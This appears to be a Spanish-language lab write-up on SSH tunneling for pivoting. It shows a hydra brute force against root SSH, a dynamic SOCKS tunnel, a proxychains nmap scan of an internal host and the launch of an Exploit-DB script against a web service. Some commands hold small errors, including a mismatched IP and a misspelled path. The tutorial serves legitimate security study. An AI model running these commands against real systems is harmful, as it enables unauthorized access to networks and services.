
SSH Tunneling es una técnica que utiliza Secure Shell (SHH) para crear túneles cifrados. Es una herramienta versátil que permite el acceso remoto, comunicación segura y sobrepasar firewalls o segmentación de redes.

En el contexto de pivoting, SSH tunneling se refiere a una técnica utilizada para utilizar conexiones a través de túneles seguros que permiten a los atacantes testear el acceso a otros sistemas.

LOCAL PORT FORWARDING:

- Redirige el trafico desde un puerto local en el sistema del cliente a un puerto específico en un sistema remoto.
- Casos de uso para Pivoting: Un forwarding de puerto local puede ser usado para conectar servicios internos en un sistema comprometido.

REMOTE PORT FORWARDING:

- Permite el tráfico desde un puerto en un sistema remoto a un puerto específico en un sistema local. Técnica importante para hace backdoor.
- Casos de uso Pivoting: El forwarding de puertos puede ser usado para crear un tunel que permite la conexión de sistemas remotos a una vía de recursos de un sistema comprometido.

DYNAMIC PORT FORWARDING:

- Crea un SOCKS proxy permitiendo un forwarding de los puertos flexibles basados en las peticiones del cliente. Es útil para varios tipos de tráfico a través de conexioes SSH.
- Caso de uso Pivoting: Puede ser usado para crear un proxy SOCKS, permitiendo un tunneling flexible.

## Ejemplo práctico:

Host víctima:
- Host1: 192.163.141.3
- Host2: 192.84.170.3

El primer paso sería realizar un escaneo de puertos:

![[Pasted image 20250310090222.png]]

Como podemos ver solo tiene el servicio de SSH, asi que vamos a hacer un ataque de fuerza bruta.

```bash
hydra -t 4 -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-40.txt ssh://182.163.141.3
```

![[Pasted image 20250310090454.png]]

Tenemos el usuario root con passwd 1234567890. Ahora podemos logearnos como root en el sistema víctima.

```bash
ssh root@192.163.141.3
```

Una vez estemos dentro del host víctima lo que vamos a hacer es un  ``ifconfig`` para ver las interfaces de red que tiene el host

![[Pasted image 20250310090722.png]]

Parece que tiene otra red interesante. Vamos a observar la versión y puerto que tenemos de SOCKS.

```bash
cat /etc/proxychains.conf
```

![[Pasted image 20250310091048.png]]

Ahora vamos a crear un túnel dinámico mediante SSH que conecte con el puerto de SOCKS.

```bash
ssh root@192.163.141.3 -D 9050
```

Una vez autenticados es importante dejar la sesión abierta y abrir un nuevo tab. Podremos comprobar con el comando ``netstat`` que estemos con el puerto 9050 vinculados.

![[Pasted image 20250310091705.png]]

Vamos a escanear el segundo host.

```bash
proxychains nmap -sT -Pn 192.84.170.3
```

![[Pasted image 20250310091854.png]]

Para poder analizar el contenido web podemos utilizar el comando ``proxychains curl http://192.84.170.3``

![[Pasted image 20250310092108.png]]

Vemos que utiliza clipper que es un servicio vulnerable.

```bash
cp /usr/share/exploitdb/exploits/php/remote/38730.py
proxychains python 38730.py http://192.84.170.3 /clupper admin pasword
```


